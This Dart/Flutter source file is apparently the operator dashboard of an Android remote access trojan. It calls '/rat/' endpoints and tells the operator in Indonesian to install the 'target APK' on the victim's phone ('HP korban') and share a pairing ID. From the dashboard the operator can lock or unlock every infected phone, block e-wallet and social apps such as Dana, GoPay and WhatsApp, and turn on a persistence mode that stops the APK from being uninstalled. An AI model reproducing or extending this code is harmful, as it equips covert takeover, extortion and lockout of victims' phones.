import 'package:flutter/material.dart';
import 'config.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';
import 'package:provider/provider.dart';
import 'theme_provider.dart';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
  });
  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  Timer? _timer;

  bool get _canGrant => true;
  bool _persistOn = false;
  bool _persistBusy = false;

  final Map<String, bool> _blockedApps = {
    'id.dana': false,
    'com.gojek.gopay': false,
    'com.whatsapp': false,
    'com.instagram.android': false,
    'com.ss.android.ugc.trill': false,
  };

  static const Map<String, String> _appNames = {
    'id.dana': 'Dana',
    'com.gojek.gopay': 'GoPay',
    'com.whatsapp': 'WhatsApp',
    'com.instagram.android': 'Instagram',
    'com.ss.android.ugc.trill': 'TikTok',
  };

  static const Map<String, IconData> _appIcons = {
    'id.dana': Icons.account_balance_wallet_rounded,
    'com.gojek.gopay': Icons.payments_rounded,
    'com.whatsapp': Icons.chat_rounded,
    'com.instagram.android': Icons.camera_alt_rounded,
    'com.ss.android.ugc.trill': Icons.music_note_rounded,
  };

  @override
  void initState() {
    super.initState();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 10), (_) => _keepAlive());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _keepAlive() async {
    if (!mounted) return;
    for (var d in _visible) {
      if (d['online'] != true) continue;
      try {
        await http
            .post(
              Uri.parse('${ApiConfig.baseUrl}/api/device/keepalive'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'id': d['id']}),
            )
            .timeout(const Duration(seconds: 5));
      } catch (_) {}
    }
  }

  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      final pRes = await http
          .get(
            Uri.parse(
              '${ApiConfig.baseUrl}/rat/pairid?key=${widget.sessionKey}&role=${widget.role}',
            ),
          )
          .timeout(const Duration(seconds: 15));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(
            Uri.parse(
              '${ApiConfig.baseUrl}/rat/my-devices?key=${widget.sessionKey}&role=${widget.role}',
            ),
          )
          .timeout(const Duration(seconds: 15));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() {
          _loading = false;
          _errorMsg = 'Server error ${dRes.statusCode}';
        });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() {
          _loading = false;
          _errorMsg = body['message'] ?? 'Error';
        });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);
      final now = DateTime.now();
      for (var d in devices) {
        if (d['online'] == true) continue;
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 120;
        } catch (_) {
          d['online'] = false;
        }
      }

      if (mounted)
        setState(() {
          _visible = devices;
          _loading = false;
          _errorMsg = null;
        });
    } catch (e) {
      if (mounted)
        setState(() {
          _loading = false;
          _errorMsg = e.toString();
        });
    }
  }

  Future<void> _togglePersist() async {
    if (_persistBusy) return;
    setState(() => _persistBusy = true);
    final target = !_persistOn;
    final cmd = target ? 'ADMIN_ON' : 'ADMIN_OFF';
    try {
      int sent = 0;
      for (var d in _visible) {
        if (d['online'] != true) continue;
        final res = await http
            .post(
              Uri.parse('${ApiConfig.baseUrl}/api/send-command'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'deviceId': d['id'], 'command': cmd}),
            )
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200) sent++;
      }
      if (mounted) {
        setState(() => _persistOn = target);
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              target
                  ? 'Persistensi aktif untuk $sent device'
                  : 'Persistensi dimatikan untuk $sent device',
            ),
            backgroundColor: target ? Colors.cyanAccent : Colors.redAccent,
            duration: const Duration(seconds: 2),
          ),
        );
      }
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Gagal: $e'),
            backgroundColor: Colors.redAccent,
          ),
        );
      }
    }
    if (mounted) setState(() => _persistBusy = false);
  }

  Future<void> _sendCommandToAll(String command) async {
    if (_visible.isEmpty) return;
    int sent = 0;
    try {
      for (var d in _visible) {
        if (d['online'] != true) continue;
        final res = await http
            .post(
              Uri.parse('${ApiConfig.baseUrl}/api/send-command'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'deviceId': d['id'], 'command': command}),
            )
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200) sent++;
      }
      if (mounted) {
        final label = command == 'LOCK' ? 'Lock' : 'Unlock';
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('$label command sent to $sent device(s)'),
            backgroundColor: command == 'LOCK'
                ? Colors.redAccent
                : Colors.green,
            duration: const Duration(seconds: 2),
          ),
        );
      }
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Gagal: $e'),
            backgroundColor: Colors.redAccent,
          ),
        );
      }
    }
  }

  Future<void> _sendBlockApp(String package, bool block) async {
    if (_visible.isEmpty) return;
    final cmd = block ? 'BLOCK_APP' : 'UNBLOCK_APP';
    int sent = 0;
    try {
      for (var d in _visible) {
        if (d['online'] != true) continue;
        final res = await http
            .post(
              Uri.parse('${ApiConfig.baseUrl}/api/send-command'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'deviceId': d['id'], 'command': cmd, 'extra': package}),
            )
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200) sent++;
      }
      if (mounted) {
        final label = _appNames[package] ?? package;
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(
              block
                  ? '$label diblokir di $sent device'
                  : '$label dibuka di $sent device',
            ),
            backgroundColor: block ? Colors.redAccent : Colors.green,
            duration: const Duration(seconds: 2),
          ),
        );
      }
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Gagal: $e'),
            backgroundColor: Colors.redAccent,
          ),
        );
      }
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: theme.primaryColor,
        content: const Text('ID berhasil disalin!'),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final theme = Provider.of<ThemeProvider>(context);

    return Scaffold(
      backgroundColor: theme.backgroundColor,
      body: SafeArea(
        child: RefreshIndicator(
          color: theme.primaryColor,
          onRefresh: () async {
            setState(() {
              _loading = true;
              _errorMsg = null;
            });
            await _loadAll();
          },
          child: Column(
            children: [
              // ── Glass Header ──────────────────────────────────────────────
              Container(
                padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
                decoration: BoxDecoration(
                  color: theme.glassPrimary,
                  border: Border(
                    bottom: BorderSide(
                      color: theme.textPrimaryColor.withOpacity(0.1),
                      width: 1,
                    ),
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: theme.primaryColor.withOpacity(0.1),
                      blurRadius: 15,
                      spreadRadius: 2,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: Column(
                  children: [
                    Row(
                      children: [
                        _statBox(
                          'ONLINE',
                          '$_active',
                          Colors.cyanAccent,
                          theme,
                        ),
                        const Spacer(),
                        Column(
                          children: [
                            Text(
                              'DEVICE DASHBOARD',
                              style: TextStyle(
                                color: theme.primaryColor,
                                fontSize: 11,
                                letterSpacing: 2,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              '@${widget.username}',
                              style: TextStyle(
                                color: theme.textSecondaryColor,
                                fontSize: 9,
                              ),
                            ),
                          ],
                        ),
                        const Spacer(),
                        _statBox(
                          'TOTAL',
                          '${_visible.length}',
                          theme.primaryColor,
                          theme,
                        ),
                      ],
                    ),

                    if (_pairId.isNotEmpty) ...[
                      const SizedBox(height: 12),
                      GestureDetector(
                        onTap: _copyPairId,
                        child: Container(
                          width: double.infinity,
                          padding: const EdgeInsets.symmetric(
                            horizontal: 14,
                            vertical: 12,
                          ),
                          decoration: BoxDecoration(
                            color: theme.primaryColor.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: theme.primaryColor.withOpacity(0.3),
                              width: 1,
                            ),
                          ),
                          child: Row(
                            children: [
                              Icon(
                                Icons.link_rounded,
                                color: theme.primaryColor,
                                size: 18,
                              ),
                              const SizedBox(width: 12),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      'ID PAIRING (bagikan ke target)',
                                      style: TextStyle(
                                        color: theme.textSecondaryColor,
                                        fontSize: 9,
                                        letterSpacing: 1,
                                      ),
                                    ),
                                    const SizedBox(height: 4),
                                    Text(
                                      _pairId,
                                      style: TextStyle(
                                        color: theme.primaryColor,
                                        fontSize: 16,
                                        fontWeight: FontWeight.bold,
                                        letterSpacing: 3,
                                        fontFamily: 'monospace',
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                              const SizedBox(width: 8),
                              Column(
                                crossAxisAlignment: CrossAxisAlignment.center,
                                children: [
                                  Icon(
                                    Icons.copy_rounded,
                                    color: theme.primaryColor,
                                    size: 18,
                                  ),
                                  const SizedBox(height: 4),
                                  Text(
                                    'SALIN',
                                    style: TextStyle(
                                      color: theme.primaryColor.withOpacity(
                                        0.8,
                                      ),
                                      fontSize: 8,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                ],
                              ),
                            ],
                          ),
                        ),
                      ),
                      const SizedBox(height: 6),
                      Text(
                        'Tap untuk menyalin Pair ID  ID ini unik milik akun @${widget.username}',
                        style: TextStyle(
                          color: theme.textSecondaryColor,
                          fontSize: 9,
                        ),
                        textAlign: TextAlign.center,
                      ),
                    ],
                  ],
                ),
              ),
              const SizedBox(height: 10),
              Container(
                padding: const EdgeInsets.symmetric(
                  horizontal: 14,
                  vertical: 10,
                ),
                decoration: BoxDecoration(
                  color: (_persistOn ? Colors.cyanAccent : Colors.redAccent)
                      .withOpacity(0.05),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: (_persistOn ? Colors.cyanAccent : Colors.redAccent)
                        .withOpacity(0.3),
                    width: 1,
                  ),
                ),
                child: Row(
                  children: [
                    Icon(
                      _persistOn ? Icons.shield_rounded : Icons.shield_outlined,
                      color: _persistOn ? Colors.cyanAccent : Colors.redAccent,
                      size: 20,
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            'MODE PERSISTENSI',
                            style: TextStyle(
                              color: _persistOn
                                  ? Colors.cyanAccent
                                  : Colors.redAccent,
                              fontSize: 10,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1.5,
                            ),
                          ),
                          const SizedBox(height: 3),
                          Text(
                            _persistOn
                                ? 'APK ga bisa dihapus dan bakal kembali lagi'
                                : 'APK bisa dihapus secara normal',
                            style: TextStyle(
                              color: theme.textSecondaryColor,
                              fontSize: 9,
                            ),
                          ),
                        ],
                      ),
                    ),
                    _persistBusy
                        ? SizedBox(
                            width: 18,
                            height: 18,
                            child: CircularProgressIndicator(
                              color: theme.primaryColor,
                              strokeWidth: 2,
                            ),
                          )
                        : GestureDetector(
                            onTap: _togglePersist,
                            child: AnimatedContainer(
                              duration: const Duration(milliseconds: 300),
                              width: 48,
                              height: 26,
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(13),
                                color: _persistOn
                                    ? Colors.cyanAccent.withOpacity(0.2)
                                    : Colors.redAccent.withOpacity(0.15),
                                border: Border.all(
                                  color:
                                      (_persistOn
                                              ? Colors.cyanAccent
                                              : Colors.redAccent)
                                          .withOpacity(0.5),
                                  width: 1,
                                ),
                              ),
                              child: AnimatedAlign(
                                duration: const Duration(milliseconds: 300),
                                alignment: _persistOn
                                    ? Alignment.centerRight
                                    : Alignment.centerLeft,
                                child: Container(
                                  width: 20,
                                  height: 20,
                                  margin: const EdgeInsets.all(3),
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    color: _persistOn
                                        ? Colors.cyanAccent
                                        : Colors.redAccent,
                                    boxShadow: [
                                      BoxShadow(
                                        color:
                                            (_persistOn
                                                    ? Colors.cyanAccent
                                                    : Colors.redAccent)
                                                .withOpacity(0.5),
                                        blurRadius: 8,
                                      ),
                                    ],
                                  ),
                                ),
                              ),
                            ),
                          ),
                  ],
                ),
              ),
              if (_errorMsg != null)
                _banner(
                  Icons.error_rounded,
                  _errorMsg!,
                  theme.primaryColor,
                  theme,
                ),

              // ── Lock / Unlock Devices ─────────────────────────────────────
              Padding(
                padding: const EdgeInsets.fromLTRB(14, 6, 14, 0),
                child: Row(
                  children: [
                    Expanded(
                      child: GestureDetector(
                        onTap: () => _sendCommandToAll('LOCK'),
                        child: Container(
                          padding: const EdgeInsets.symmetric(vertical: 10),
                          decoration: BoxDecoration(
                            color: Colors.redAccent.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(
                              color: Colors.redAccent.withOpacity(0.3),
                            ),
                          ),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(
                                Icons.lock_rounded,
                                color: Colors.redAccent,
                                size: 16,
                              ),
                              const SizedBox(width: 6),
                              Text(
                                'LOCK ALL',
                                style: TextStyle(
                                  color: Colors.redAccent,
                                  fontSize: 10,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: GestureDetector(
                        onTap: () => _sendCommandToAll('UNLOCK'),
                        child: Container(
                          padding: const EdgeInsets.symmetric(vertical: 10),
                          decoration: BoxDecoration(
                            color: Colors.green.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(
                              color: Colors.green.withOpacity(0.3),
                            ),
                          ),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(
                                Icons.lock_open_rounded,
                                color: Colors.green,
                                size: 16,
                              ),
                              const SizedBox(width: 6),
                              Text(
                                'UNLOCK ALL',
                                style: TextStyle(
                                  color: Colors.green,
                                  fontSize: 10,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),

              // ── Block Apps ─────────────────────────────────────────────────
              Padding(
                padding: const EdgeInsets.fromLTRB(14, 8, 14, 0),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Icon(Icons.block_rounded, color: Colors.orangeAccent, size: 13),
                        const SizedBox(width: 6),
                        Text(
                          'BLOCK APPS',
                          style: TextStyle(
                            color: Colors.orangeAccent,
                            fontSize: 9,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1.5,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 8),
                    Row(
                      children: _blockedApps.keys.map((pkg) {
                        final on = _blockedApps[pkg] ?? false;
                        final name = _appNames[pkg] ?? pkg;
                        final icon = _appIcons[pkg] ?? Icons.android;
                        return Expanded(
                          child: GestureDetector(
                            onTap: () {
                              setState(() => _blockedApps[pkg] = !on);
                              _sendBlockApp(pkg, !on);
                            },
                            child: Container(
                              margin: const EdgeInsets.symmetric(horizontal: 2),
                              padding: const EdgeInsets.symmetric(vertical: 8),
                              decoration: BoxDecoration(
                                color: on
                                    ? Colors.orangeAccent.withOpacity(0.15)
                                    : Colors.white.withOpacity(0.03),
                                borderRadius: BorderRadius.circular(8),
                                border: Border.all(
                                  color: on
                                      ? Colors.orangeAccent.withOpacity(0.5)
                                      : Colors.white.withOpacity(0.08),
                                  width: 1,
                                ),
                              ),
                              child: Column(
                                children: [
                                  Icon(
                                    icon,
                                    color: on ? Colors.orangeAccent : Colors.white38,
                                    size: 16,
                                  ),
                                  const SizedBox(height: 4),
                                  Text(
                                    name,
                                    style: TextStyle(
                                      color: on ? Colors.orangeAccent : Colors.white38,
                                      fontSize: 7,
                                      fontWeight: FontWeight.w600,
                                    ),
                                    textAlign: TextAlign.center,
                                  ),
                                ],
                              ),
                            ),
                          ),
                        );
                      }).toList(),
                    ),
                  ],
                ),
              ),

              // ── Toolbar dengan tombol Kelola Akses ────────────────────────
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 10, 16, 6),
                child: Row(
                  children: [
                    Text(
                      'CONNECTED DEVICES',
                      style: TextStyle(
                        color: theme.textSecondaryColor,
                        fontSize: 10,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1.5,
                      ),
                    ),
                    const Spacer(),
                    if (_canGrant)
                      GestureDetector(
                        onTap: () => Navigator.push(
                          context,
                          MaterialPageRoute(
                            builder: (_) => DevicePermissionManagerPage(
                              sessionKey: widget.sessionKey,
                              allDevices: _visible,
                              role: widget.role,
                            ),
                          ),
                        ),
                        child: Container(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 10,
                            vertical: 6,
                          ),
                          decoration: BoxDecoration(
                            color: theme.accentColor.withOpacity(0.12),
                            borderRadius: BorderRadius.circular(8),
                            border: Border.all(
                              color: theme.accentColor.withOpacity(0.25),
                            ),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Icon(
                                Icons.admin_panel_settings_rounded,
                                color: theme.accentColor,
                                size: 14,
                              ),
                              const SizedBox(width: 5),
                              Text(
                                'KELOLA AKSES',
                                style: TextStyle(
                                  color: theme.accentColor,
                                  fontSize: 9,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    if (_canGrant) const SizedBox(width: 8),
                    GestureDetector(
                      onTap: () {
                        setState(() {
                          _loading = true;
                          _errorMsg = null;
                        });
                        _loadAll();
                      },
                      child: Icon(
                        Icons.refresh_rounded,
                        color: theme.primaryColor,
                        size: 18,
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: const Icon(
                        Icons.close_rounded,
                        color: Colors.redAccent,
                        size: 18,
                      ),
                    ),
                  ],
                ),
              ),

              // ── Device Grid ───────────────────────────────────────────────
              Expanded(
                child: _loading
                    ? Center(
                        child: CircularProgressIndicator(
                          color: theme.primaryColor,
                          strokeWidth: 2,
                        ),
                      )
                    : _visible.isEmpty
                    ? Center(
                        child: SingleChildScrollView(
                          physics: const AlwaysScrollableScrollPhysics(),
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Container(
                                width: 72,
                                height: 72,
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  color: theme.glassPrimary,
                                  border: Border.all(
                                    color: theme.textSecondaryColor.withOpacity(
                                      0.2,
                                    ),
                                  ),
                                ),
                                child: Icon(
                                  Icons.devices_other_rounded,
                                  color: theme.textSecondaryColor.withOpacity(
                                    0.4,
                                  ),
                                  size: 36,
                                ),
                              ),
                              const SizedBox(height: 18),
                              const Text(
                                'NO DEVICES',
                                style: TextStyle(
                                  color: Colors.white,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 2,
                                  fontSize: 13,
                                ),
                              ),
                              const SizedBox(height: 6),
                              Text(
                                'Belum ada device terhubung',
                                style: TextStyle(
                                  color: theme.textSecondaryColor,
                                  fontSize: 11,
                                ),
                              ),
                              const SizedBox(height: 20),
                              Container(
                                margin: const EdgeInsets.symmetric(
                                  horizontal: 40,
                                ),
                                padding: const EdgeInsets.all(16),
                                decoration: BoxDecoration(
                                  color: theme.primaryColor.withOpacity(0.05),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                    color: theme.primaryColor.withOpacity(0.2),
                                  ),
                                ),
                                child: Column(
                                  children: [
                                    Icon(
                                      Icons.info_outline_rounded,
                                      color: theme.primaryColor,
                                      size: 22,
                                    ),
                                    const SizedBox(height: 10),
                                    const Text(
                                      'Cara hubungkan device:',
                                      style: TextStyle(
                                        color: Colors.white,
                                        fontSize: 11,
                                        fontWeight: FontWeight.bold,
                                      ),
                                    ),
                                    const SizedBox(height: 8),
                                    const Text(
                                      '1. Install APK target di HP korban\n2. Buka APK → masukkan ID Pairing di atas\n3. Device otomatis muncul di sini',
                                      style: TextStyle(
                                        color: Colors.white54,
                                        fontSize: 10,
                                      ),
                                      textAlign: TextAlign.center,
                                    ),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        ),
                      )
                    : GridView.builder(
                        padding: const EdgeInsets.fromLTRB(14, 8, 14, 100),
                        gridDelegate:
                            const SliverGridDelegateWithFixedCrossAxisCount(
                              crossAxisCount: 3,
                              crossAxisSpacing: 10,
                              mainAxisSpacing: 10,
                              childAspectRatio: 0.72,
                            ),
                        itemCount: _visible.length,
                        itemBuilder: (ctx, i) {
                          final d = _visible[i];
                          final on = d['online'] == true;
                          final sc = on ? Colors.cyanAccent : Colors.redAccent;

                          return GestureDetector(
                            onTap: () => Navigator.push(
                              ctx,
                              MaterialPageRoute(
                                builder: (_) => ControlCenterPage(
                                  targetDevice: d,
                                  role: widget.role,
                                ),
                              ),
                            ),
                            child: Container(
                              padding: const EdgeInsets.all(10),
                              decoration: BoxDecoration(
                                color: theme.glassPrimary,
                                borderRadius: BorderRadius.circular(14),
                                border: Border.all(
                                  color: on
                                      ? theme.primaryColor.withOpacity(0.3)
                                      : theme.textPrimaryColor.withOpacity(0.1),
                                  width: 1,
                                ),
                                boxShadow: on
                                    ? [
                                        BoxShadow(
                                          color: theme.primaryColor.withOpacity(
                                            0.1,
                                          ),
                                          blurRadius: 8,
                                          spreadRadius: 1,
                                        ),
                                      ]
                                    : null,
                              ),
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Row(
                                    mainAxisAlignment:
                                        MainAxisAlignment.spaceBetween,
                                    children: [
                                      Icon(
                                        Icons.phone_android_rounded,
                                        color: theme.textSecondaryColor,
                                        size: 14,
                                      ),
                                      Container(
                                        padding: const EdgeInsets.symmetric(
                                          horizontal: 5,
                                          vertical: 2,
                                        ),
                                        decoration: BoxDecoration(
                                          color: sc.withOpacity(0.1),
                                          border: Border.all(
                                            color: sc.withOpacity(0.5),
                                          ),
                                          borderRadius: BorderRadius.circular(
                                            6,
                                          ),
                                        ),
                                        child: Row(
                                          children: [
                                            Container(
                                              width: 5,
                                              height: 5,
                                              decoration: BoxDecoration(
                                                color: sc,
                                                shape: BoxShape.circle,
                                              ),
                                            ),
                                            const SizedBox(width: 4),
                                            Text(
                                              on ? 'ON' : 'OFF',
                                              style: TextStyle(
                                                color: sc,
                                                fontSize: 7,
                                                fontWeight: FontWeight.bold,
                                              ),
                                            ),
                                          ],
                                        ),
                                      ),
                                    ],
                                  ),
                                  const Spacer(),
                                  Text(
                                    d['model'] ?? 'Unknown',
                                    style: TextStyle(
                                      color: theme.textPrimaryColor,
                                      fontSize: 10,
                                      fontWeight: FontWeight.bold,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                  const SizedBox(height: 4),
                                  Text(
                                    d['id'] ?? '-',
                                    style: TextStyle(
                                      color: theme.textSecondaryColor,
                                      fontSize: 8,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                  const Spacer(),
                                  Row(
                                    children: [
                                      Icon(
                                        Icons.battery_charging_full_rounded,
                                        color: theme.textSecondaryColor,
                                        size: 11,
                                      ),
                                      const SizedBox(width: 4),
                                      Text(
                                        '${d['battery'] ?? '?'}%',
                                        style: TextStyle(
                                          color: theme.textPrimaryColor,
                                          fontSize: 9,
                                        ),
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                            ),
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _banner(IconData icon, String msg, Color c, ThemeProvider theme) =>
      Container(
        margin: const EdgeInsets.fromLTRB(14, 8, 14, 0),
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: c.withOpacity(0.05),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: c.withOpacity(0.2)),
        ),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Icon(icon, color: c, size: 16),
            const SizedBox(width: 10),
            Expanded(
              child: Text(
                msg,
                style: TextStyle(color: c, fontSize: 11, height: 1.4),
              ),
            ),
          ],
        ),
      );

  Widget _statBox(String l, String v, Color c, ThemeProvider theme) => Column(
    children: [
      Text(
        l,
        style: TextStyle(
          color: theme.textSecondaryColor,
          fontSize: 8,
          letterSpacing: 1,
        ),
      ),
      const SizedBox(height: 4),
      Text(
        v,
        style: TextStyle(
          color: c,
          fontSize: 20,
          fontWeight: FontWeight.bold,
          shadows: [
            Shadow(
              blurRadius: 8,
              color: c.withOpacity(0.5),
              offset: const Offset(0, 0),
            ),
          ],
        ),
      ),
    ],
  );
}
